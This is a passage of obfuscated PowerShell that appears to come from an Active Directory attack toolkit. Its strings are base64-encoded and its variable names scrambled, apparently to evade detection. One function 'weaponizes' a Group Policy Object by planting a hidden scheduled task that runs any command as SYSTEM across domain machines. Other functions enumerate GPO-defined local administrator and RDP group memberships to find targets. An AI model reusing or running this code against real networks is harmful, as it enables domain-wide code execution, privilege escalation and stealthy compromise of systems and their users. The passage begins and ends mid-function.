        $ADSpath,
        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]
        [Switch]
        $Force,
        [Parameter(ParameterSetName = 'Remove')]
        [Switch]
        $Remove,
        [Parameter(ParameterSetName = 'Create')]
        [Parameter(ParameterSetName = 'Remove')]        
        [Management.Automation.PSCredential]
        $Credential
    )
    ${___/\/==\/====\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAA/AHgAbQBsACAAdgBlAHIAcwBpAG8AbgA9ACIAMQAuADAAIgAgAGUAbgBjAG8AZABpAG4AZwA9ACIAdQB0AGYALQA4ACIAPwA+ADwAUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBzACAAYwBsAHMAaQBkAD0AIgB7AEMAQwA2ADMARgAyADAAMAAtADcAMwAwADkALQA0AGIAYQAwAC0AQgAxADUANAAtAEEANwAxAEMARAAxADEAOABEAEIAQwBDAH0AIgA+ADwASQBtAG0AZQBkAGkAYQB0AGUAVABhAHMAawBWADIAIABjAGwAcwBpAGQAPQAiAHsAOQA3ADUANgBCADUAOAAxAC0ANwA2AEUAQwAtADQAMQA2ADkALQA5AEEARgBDAC0AMABDAEEAOABEADQAMwBBAEQAQgA1AEYAfQAiACAAbgBhAG0AZQA9ACIA')))+$TaskName+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgAgAGkAbQBhAGcAZQA9ACIAMAAiACAAYwBoAGEAbgBnAGUAZAA9ACIA')))+$TaskModifiedDate+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgAgAHUAaQBkAD0AIgB7AA==')))+$([guid]::NewGuid())+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('fQAiACAAdQBzAGUAcgBDAG8AbgB0AGUAeAB0AD0AIgAwACIAIAByAGUAbQBvAHYAZQBQAG8AbABpAGMAeQA9ACIAMAAiAD4APABQAHIAbwBwAGUAcgB0AGkAZQBzACAAYQBjAHQAaQBvAG4APQAiAEMAIgAgAG4AYQBtAGUAPQAiAA==')))+$TaskName+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgAgAHIAdQBuAEEAcwA9ACIATgBUACAAQQBVAFQASABPAFIASQBUAFkAXABTAHkAcwB0AGUAbQAiACAAbABvAGcAbwBuAFQAeQBwAGUAPQAiAFMANABVACIAPgA8AFQAYQBzAGsAIAB2AGUAcgBzAGkAbwBuAD0AIgAxAC4AMwAiAD4APABSAGUAZwBpAHMAdAByAGEAdABpAG8AbgBJAG4AZgBvAD4APABBAHUAdABoAG8AcgA+AA==')))+$TaskAuthor+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAAvAEEAdQB0AGgAbwByAD4APABEAGUAcwBjAHIAaQBwAHQAaQBvAG4APgA=')))+$TaskDescription+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAAvAEQAZQBzAGMAcgBpAHAAdABpAG8AbgA+ADwALwBSAGUAZwBpAHMAdAByAGEAdABpAG8AbgBJAG4AZgBvAD4APABQAHIAaQBuAGMAaQBwAGEAbABzAD4APABQAHIAaQBuAGMAaQBwAGEAbAAgAGkAZAA9ACIAQQB1AHQAaABvAHIAIgA+ADwAVQBzAGUAcgBJAGQAPgBOAFQAIABBAFUAVABIAE8AUgBJAFQAWQBcAFMAeQBzAHQAZQBtADwALwBVAHMAZQByAEkAZAA+ADwAUgB1AG4ATABlAHYAZQBsAD4ASABpAGcAaABlAHMAdABBAHYAYQBpAGwAYQBiAGwAZQA8AC8AUgB1AG4ATABlAHYAZQBsAD4APABMAG8AZwBvAG4AVAB5AHAAZQA+AFMANABVADwALwBMAG8AZwBvAG4AVAB5AHAAZQA+ADwALwBQAHIAaQBuAGMAaQBwAGEAbAA+ADwALwBQAHIAaQBuAGMAaQBwAGEAbABzAD4APABTAGUAdAB0AGkAbgBnAHMAPgA8AEkAZABsAGUAUwBlAHQAdABpAG4AZwBzAD4APABEAHUAcgBhAHQAaQBvAG4APgBQAFQAMQAwAE0APAAvAEQAdQByAGEAdABpAG8AbgA+ADwAVwBhAGkAdABUAGkAbQBlAG8AdQB0AD4AUABUADEASAA8AC8AVwBhAGkAdABUAGkAbQBlAG8AdQB0AD4APABTAHQAbwBwAE8AbgBJAGQAbABlAEUAbgBkAD4AdAByAHUAZQA8AC8AUwB0AG8AcABPAG4ASQBkAGwAZQBFAG4AZAA+ADwAUgBlAHMAdABhAHIAdABPAG4ASQBkAGwAZQA+AGYAYQBsAHMAZQA8AC8AUgBlAHMAdABhAHIAdABPAG4ASQBkAGwAZQA+ADwALwBJAGQAbABlAFMAZQB0AHQAaQBuAGcAcwA+ADwATQB1AGwAdABpAHAAbABlAEkAbgBzAHQAYQBuAGMAZQBzAFAAbwBsAGkAYwB5AD4ASQBnAG4AbwByAGUATgBlAHcAPAAvAE0AdQBsAHQAaQBwAGwAZQBJAG4AcwB0AGEAbgBjAGUAcwBQAG8AbABpAGMAeQA+ADwARABpAHMAYQBsAGwAbwB3AFMAdABhAHIAdABJAGYATwBuAEIAYQB0AHQAZQByAGkAZQBzAD4AZgBhAGwAcwBlADwALwBEAGkAcwBhAGwAbABvAHcAUwB0AGEAcgB0AEkAZgBPAG4AQgBhAHQAdABlAHIAaQBlAHMAPgA8AFMAdABvAHAASQBmAEcAbwBpAG4AZwBPAG4AQgBhAHQAdABlAHIAaQBlAHMAPgB0AHIAdQBlADwALwBTAHQAbwBwAEkAZgBHAG8AaQBuAGcATwBuAEIAYQB0AHQAZQByAGkAZQBzAD4APABBAGwAbABvAHcASABhAHIAZABUAGUAcgBtAGkAbgBhAHQAZQA+AGYAYQBsAHMAZQA8AC8AQQBsAGwAbwB3AEgAYQByAGQAVABlAHIAbQBpAG4AYQB0AGUAPgA8AFMAdABhAHIAdABXAGgAZQBuAEEAdgBhAGkAbABhAGIAbABlAD4AdAByAHUAZQA8AC8AUwB0AGEAcgB0AFcAaABlAG4AQQB2AGEAaQBsAGEAYgBsAGUAPgA8AEEAbABsAG8AdwBTAHQAYQByAHQATwBuAEQAZQBtAGEAbgBkAD4AZgBhAGwAcwBlADwALwBBAGwAbABvAHcAUwB0AGEAcgB0AE8AbgBEAGUAbQBhAG4AZAA+ADwARQBuAGEAYgBsAGUAZAA+AHQAcgB1AGUAPAAvAEUAbgBhAGIAbABlAGQAPgA8AEgAaQBkAGQAZQBuAD4AdAByAHUAZQA8AC8ASABpAGQAZABlAG4APgA8AEUAeABlAGMAdQB0AGkAbwBuAFQAaQBtAGUATABpAG0AaQB0AD4AUABUADAAUwA8AC8ARQB4AGUAYwB1AHQAaQBvAG4AVABpAG0AZQBMAGkAbQBpAHQAPgA8AFAAcgBpAG8AcgBpAHQAeQA+ADcAPAAvAFAAcgBpAG8AcgBpAHQAeQA+ADwARABlAGwAZQB0AGUARQB4AHAAaQByAGUAZABUAGEAcwBrAEEAZgB0AGUAcgA+AFAAVAAwAFMAPAAvAEQAZQBsAGUAdABlAEUAeABwAGkAcgBlAGQAVABhAHMAawBBAGYAdABlAHIAPgA8AFIAZQBzAHQAYQByAHQATwBuAEYAYQBpAGwAdQByAGUAPgA8AEkAbgB0AGUAcgB2AGEAbAA+AFAAVAAxADUATQA8AC8ASQBuAHQAZQByAHYAYQBsAD4APABDAG8AdQBuAHQAPgAzADwALwBDAG8AdQBuAHQAPgA8AC8AUgBlAHMAdABhAHIAdABPAG4ARgBhAGkAbAB1AHIAZQA+ADwALwBTAGUAdAB0AGkAbgBnAHMAPgA8AEEAYwB0AGkAbwBuAHMAIABDAG8AbgB0AGUAeAB0AD0AIgBBAHUAdABoAG8AcgAiAD4APABFAHgAZQBjAD4APABDAG8AbQBtAGEAbgBkAD4A')))+$Command+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAAvAEMAbwBtAG0AYQBuAGQAPgA8AEEAcgBnAHUAbQBlAG4AdABzAD4A')))+$CommandArguments+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('PAAvAEEAcgBnAHUAbQBlAG4AdABzAD4APAAvAEUAeABlAGMAPgA8AC8AQQBjAHQAaQBvAG4AcwA+ADwAVAByAGkAZwBnAGUAcgBzAD4APABUAGkAbQBlAFQAcgBpAGcAZwBlAHIAPgA8AFMAdABhAHIAdABCAG8AdQBuAGQAYQByAHkAPgAlAEwAbwBjAGEAbABUAGkAbQBlAFgAbQBsAEUAeAAlADwALwBTAHQAYQByAHQAQgBvAHUAbgBkAGEAcgB5AD4APABFAG4AZABCAG8AdQBuAGQAYQByAHkAPgAlAEwAbwBjAGEAbABUAGkAbQBlAFgAbQBsAEUAeAAlADwALwBFAG4AZABCAG8AdQBuAGQAYQByAHkAPgA8AEUAbgBhAGIAbABlAGQAPgB0AHIAdQBlADwALwBFAG4AYQBiAGwAZQBkAD4APAAvAFQAaQBtAGUAVAByAGkAZwBnAGUAcgA+ADwALwBUAHIAaQBnAGcAZQByAHMAPgA8AC8AVABhAHMAawA+ADwALwBQAHIAbwBwAGUAcgB0AGkAZQBzAD4APAAvAEkAbQBtAGUAZABpAGEAdABlAFQAYQBzAGsAVgAyAD4APAAvAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAcwA+AA==')))
    if (!$PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AbgBhAG0AZQA=')))] -and !$PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBpAHQAaABlAHIAIAAtAEcAUABPAE4AYQBtAGUAIABvAHIAIAAtAEcAUABPAEQAaQBzAHAAbABhAHkATgBhAG0AZQAgAG0AdQBzAHQAIABiAGUAIABzAHAAZQBjAGkAZgBpAGUAZAA=')))
        return
    }
    ${_/\_/\__/==\/===\} = ___/\/==\_____/\__ -GPOname $GPOname -_/=\/\_/\__/\_/=\_ $GPODisplayName -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -Credential $Credential 
    if(!${_/\_/\__/==\/===\}) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAARwBQAE8AIABmAG8AdQBuAGQALgA=')))
        return
    }
    ${_/\_/\__/==\/===\} | % {
        ${/==\/===\/=\_/==\} = $_.Name
        try {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHkAaQBuAGcAIAB0AG8AIAB3AGUAYQBwAG8AbgBpAHoAZQAgAEcAUABPADoAIAAkAHsALwA9AD0AXAAvAD0APQA9AFwALwA9AFwAXwAvAD0APQBcAH0A')))
            if($Credential) {
                Write-Verbose "Mapping '$($_.gpcfilesyspath)' to network drive N:\"
                $Path = $_.gpcfilesyspath.TrimEnd('\')
                ${/=\/\/\_/\/\_____} = New-Object -ComObject WScript.Network
                ${/=\/\/\_/\/\_____}.MapNetworkDrive("N:", $Path, $False, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                ${________/\/==\/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgA6AFwATQBhAGMAaABpAG4AZQBcAFAAcgBlAGYAZQByAGUAbgBjAGUAcwBcAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAcwBcAA==')))
            }
            else {
                ${________/\/==\/==} = $_.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAGEAYwBoAGkAbgBlAFwAUAByAGUAZgBlAHIAZQBuAGMAZQBzAFwAUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBzAFwA')))
            }
            if($Remove) {
                if(!(Test-Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAF8AXwBfAF8AXwAvAFwALwA9AD0AXAAvAD0APQB9AFwAUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBzAC4AeABtAGwA'))))) {
                    Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIAB0AGEAcwBrACAAZABvAGUAcwBuACcAdAAgAGUAeABpAHMAdAAgAGEAdAAgACQAewBfAF8AXwBfAF8AXwBfAF8ALwBcAC8APQA9AFwALwA9AD0AfQBcAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAcwAuAHgAbQBsAA==')))
                }
                if (!$Force -and !$psCmdlet.ShouldContinue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvACAAeQBvAHUAIAB3AGEAbgB0ACAAdABvACAAYwBvAG4AdABpAG4AdQBlAD8A'))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGkAbgBnACAAcwBjAGgAdABhAHMAawAgAGEAdAAgACQAewBfAF8AXwBfAF8AXwBfAF8ALwBcAC8APQA9AFwALwA9AD0AfQBcAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAcwAuAHgAbQBsAA=='))))) {
                    return
                }
                rd -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAF8AXwBfAF8AXwAvAFwALwA9AD0AXAAvAD0APQB9AFwAUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBzAC4AeABtAGwA'))) -Force
            }
            else {
                if (!$Force -and !$psCmdlet.ShouldContinue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvACAAeQBvAHUAIAB3AGEAbgB0ACAAdABvACAAYwBvAG4AdABpAG4AdQBlAD8A'))),$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGkAbgBnACAAcwBjAGgAdABhAHMAawAgAGEAdAAgACQAewBfAF8AXwBfAF8AXwBfAF8ALwBcAC8APQA9AFwALwA9AD0AfQBcAFMAYwBoAGUAZAB1AGwAZQBkAFQAYQBzAGsAcwAuAHgAbQBsAA=='))))) {
                    return
                }
                $Null = ni -ItemType Directory -Force -Path ${________/\/==\/==}
                if(Test-Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAF8AXwBfAF8AXwAvAFwALwA9AD0AXAAvAD0APQB9AFwAUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBzAC4AeABtAGwA')))) {
                    Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAIAB0AGEAcwBrACAAYQBsAHIAZQBhAGQAeQAgAGUAeABpAHMAdABzACAAYQB0ACAAJAB7AF8AXwBfAF8AXwBfAF8AXwAvAFwALwA9AD0AXAAvAD0APQB9AFwAUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBzAC4AeABtAGwAIAAhAA==')))
                }
                ${___/\/==\/====\/=} | sc -Encoding ASCII -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAF8AXwBfAF8AXwAvAFwALwA9AD0AXAAvAD0APQB9AFwAUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBzAC4AeABtAGwA')))
            }
            if($Credential) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGkAbgBnACAAbQBvAHUAbgB0AGUAZAAgAGQAcgBpAHYAZQAgAGEAdAAgAE4AOgBcAA==')))
                ${/=\/\/\_/\/\_____} = New-Object -ComObject WScript.Network
                ${/=\/\/\_/\/\_____}.RemoveNetworkDrive("N:")
            }
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZgBvAHIAIABHAFAATwAgACQAewAvAD0APQBcAC8APQA9AD0AXAAvAD0AXABfAC8APQA9AFwAfQAgADoAIAAkAF8A')))
            if($Credential) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGkAbgBnACAAbQBvAHUAbgB0AGUAZAAgAGQAcgBpAHYAZQAgAGEAdAAgAE4AOgBcAA==')))
                ${/=\/\/\_/\/\_____} = New-Object -ComObject WScript.Network
                ${/=\/\/\_/\/\_____}.RemoveNetworkDrive("N:")
            }
        }
    }
}
function ___/\/\/\/=\__/==\ {
    [CmdletBinding()]
    Param (
        [String]
        $GPOname = '*',
        [String]
        ${_/=\/\_/\__/\_/=\_},
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        ${__/\/\_/\_/\/=\/=\},
        [Switch]
        $UsePSDrive,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    ${_/\/====\_/\/==\/} = [System.StringSplitOptions]::RemoveEmptyEntries
    ___/\/==\_____/\__ -GPOName $GPOname -_/=\/\_/\__/\_/=\_ ${_/=\/\_/\__/\_/=\_} -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize | % {
        $GPOdisplayName = $_.displayname
        $GPOname = $_.name
        ${/===\_______/\_/=} = $_.gpcfilesyspath
        ${_/=\__/==\_/\___/} =  @{
            'GptTmplPath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAF8AXwBfAF8AXwBfAC8AXABfAC8APQB9AFwATQBBAEMASABJAE4ARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAFMAZQBjAEUAZABpAHQAXABHAHAAdABUAG0AcABsAC4AaQBuAGYA')))
            'UsePSDrive' = $UsePSDrive
        }
        ${/==\_/=\__/===\_/} = __/====\/====\/=\/ @_/=\__/==\_/\___/
        if(${/==\_/=\__/===\_/} -and (${/==\_/=\__/===\_/}.psbase.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwACAATQBlAG0AYgBlAHIAcwBoAGkAcAA='))))) {
            ${/=\_/\___/==\/\/=} = @{}
            ForEach (${_/\___/==\/=====\} in ${/==\_/=\__/===\_/}.'Group Membership'.GetEnumerator()) {
                ${_/=\/\/=\_/\__/\/}, $Relation = ${_/\___/==\/=====\}.Key.Split('__', ${_/\/====\_/\/==\/}) | % {$_.Trim()}
                ${/==\/\/\___/=\/\_} = ${_/\___/==\/=====\}.Value | ? {$_} | % { $_.Trim('*') } | ? {$_}
                if(${__/\/\_/\_/\/=\/=\}) {
                    ${/=\__/\_/\_/====\} = @()
                    ForEach(${/=\/\_/\_/\_/==\/} in ${/==\/\/\___/=\/\_}) {
                        if(${/=\/\_/\_/\_/==\/} -and (${/=\/\_/\_/\_/==\/}.Trim() -ne '')) {
                            if(${/=\/\_/\_/\_/==\/} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                ${/==\/\___/=\_/\/\} = __/\__/=\_/\/=\___ -Domain $Domain -__/\/==\_/\___/\/\ ${/=\/\_/\_/\_/==\/} | select -ExpandProperty SID
                                if(${/==\/\___/=\_/\/\}) {
                                    ${/=\__/\_/\_/====\} += ${/==\/\___/=\_/\/\}
                                }
                                else {
                                    ${/=\__/\_/\_/====\} += ${/=\/\_/\_/\_/==\/}
                                }
                            }
                            else {
                                ${/=\__/\_/\_/====\} += ${/=\/\_/\_/\_/==\/}
                            }
                        }
                    }
                    ${/==\/\/\___/=\/\_} = ${/=\__/\_/\_/====\}
                }
                if(-not ${/=\_/\___/==\/\/=}[${_/=\/\/=\_/\__/\/}]) {
                    ${/=\_/\___/==\/\/=}[${_/=\/\/=\_/\__/\/}] = @{}
                }
                if(${/==\/\/\___/=\/\_} -isnot [System.Array]) {${/==\/\/\___/=\/\_} = @(${/==\/\/\___/=\/\_})}
                ${/=\_/\___/==\/\/=}[${_/=\/\/=\_/\__/\/}].Add($Relation, ${/==\/\/\___/=\/\_})
            }
            ForEach (${_/\___/==\/=====\} in ${/=\_/\___/==\/\/=}.GetEnumerator()) {
                if(${_/\___/==\/=====\} -and ${_/\___/==\/=====\}.Key -and (${_/\___/==\/=====\}.Key -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcACoA'))))) {
                    ${/====\_/\_/==\/=\} = ${_/\___/==\/=====\}.Key.Trim('*')
                    if(${/====\_/\_/==\/=\} -and (${/====\_/\_/==\/=\}.Trim() -ne '')) {
                        $GroupName = __/\_/\_/\__/\/\/\ -__/\/=\/\_/\/====\ ${/====\_/\_/==\/=\}
                    }
                    else {
                        $GroupName = $False
                    }
                }
                else {
                    $GroupName = ${_/\___/==\/=====\}.Key
                    if($GroupName -and ($GroupName.Trim() -ne '')) {
                        if($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                            ${/====\_/\_/==\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                        }
                        elseif($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                            ${/====\_/\_/==\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                        }
                        elseif($Groupname -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                            ${/====\_/\_/==\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                        }
                        elseif($GroupName.Trim() -ne '') {
                            ${/====\_/\_/==\/=\} = __/\__/=\_/\/=\___ -Domain $Domain -__/\/==\_/\___/\/\ $Groupname | select -ExpandProperty SID
                        }
                        else {
                            ${/====\_/\_/==\/=\} = $Null
                        }
                    }
                }
                ${___/\_/\_/\___/\/} = New-Object PSObject
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPODisplayName
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${/===\_______/\_/=}
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZABHAHIAbwB1AHAAcwA=')))
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) $Null
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) ${/====\_/\_/==\/=\}
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) ${_/\___/==\/=====\}.Value.Memberof
                ${___/\_/\_/\___/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) ${_/\___/==\/=====\}.Value.Members
                ${___/\_/\_/\___/\/}
            }
        }
        ${_/=\__/==\_/\___/} =  @{
            'GroupsXMLpath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAF8AXwBfAF8AXwBfAC8AXABfAC8APQB9AFwATQBBAEMASABJAE4ARQBcAFAAcgBlAGYAZQByAGUAbgBjAGUAcwBcAEcAcgBvAHUAcABzAFwARwByAG8AdQBwAHMALgB4AG0AbAA=')))
            'UsePSDrive' = $UsePSDrive
        }
        _/==\__/===\_/\/\_ @_/=\__/==\_/\___/ | % {
            if(${__/\/\_/\_/\/=\/=\}) {
                ${/=\__/\_/\_/====\} = @()
                ForEach(${/=\/\_/\_/\_/==\/} in $_.GroupMembers) {
                    if(${/=\/\_/\_/\_/==\/} -and (${/=\/\_/\_/\_/==\/}.Trim() -ne '')) {
                        if(${/=\/\_/\_/\_/==\/} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                            ${/==\/\___/=\_/\/\} = __/\__/=\_/\/=\___ -Domain $Domain -__/\/==\_/\___/\/\ ${/=\/\_/\_/\_/==\/} | select -ExpandProperty SID
                            if(${/==\/\___/=\_/\/\}) {
                                ${/=\__/\_/\_/====\} += ${/==\/\___/=\_/\/\}
                            }
                            else {
                                ${/=\__/\_/\_/====\} += ${/=\/\_/\_/\_/==\/}
                            }
                        }
                        else {
                            ${/=\__/\_/\_/====\} += ${/=\/\_/\_/\_/==\/}
                        }
                    }
                }
                $_.GroupMembers = ${/=\__/\_/\_/====\}
            }
            $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPODisplayName
            $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
            $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAbwBsAGkAYwB5AFAAcgBlAGYAZQByAGUAbgBjAGUAcwA=')))
            $_
        }
    }
}
function Find-GPOLocation {
    [CmdletBinding()]
    Param (
        [String]
        $UserName,
        [String]
        $GroupName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $LocalGroup = 'Administrators',
        [Switch]
        $UsePSDrive,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    if($UserName) {
        ${_/\_/=\/\/=\_/===} = __/=\_/\_/\/=\___/ -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize | select -First 1
        ${_/\____/\/\/=\___} = ${_/\_/=\/\/=\_/===}.objectsid
        if(-not ${_/\____/\/\/=\___}) {    
            Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgAgACcAJABVAHMAZQByAE4AYQBtAGUAJwAgAG4AbwB0ACAAZgBvAHUAbgBkACEA')))
        }
        ${_/\/===\/\/=\__/=} = @(${_/\____/\/\/=\___})
        ${_/=\__/==\/\_/\/=} = ${_/\_/=\/\/=\_/===}.samaccountname
        ${__/=\_____/=\__/\} = ${_/\____/\/\/=\___}
    }
    elseif($GroupName) {
        ${_/=\/\/=\_/\__/\/} = _____/\/===\/=\/== -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | select -First 1
        ${/====\_/\_/==\/=\} = ${_/=\/\/=\_/\__/\/}.objectsid
        if(-not ${/====\_/\_/==\/=\}) {    
            Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwACAAJwAkAEcAcgBvAHUAcABOAGEAbQBlACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhAA==')))
        }
        ${_/\/===\/\/=\__/=} = @(${/====\_/\_/==\/=\})
        ${_/=\__/==\/\_/\/=} = ${_/=\/\/=\_/\__/\/}.samaccountname
        ${__/=\_____/=\__/\} = ${/====\_/\_/==\/=\}
    }
    else {
        ${_/\/===\/\/=\__/=} = @('*')
    }
    if($LocalGroup -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBAGQAbQBpAG4AKgA=')))) {
        ${__/\/\_/==\/==\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
    }
    elseif ( ($LocalGroup -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBSAEQAUAAqAA==')))) -or ($LocalGroup -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBSAGUAbQBvAHQAZQAqAA==')))) ) {
        ${__/\/\_/==\/==\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
    }
    elseif ($LocalGroup -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AKgA=')))) {
        ${__/\/\_/==\/==\/\} = $LocalGroup
    }
    else {
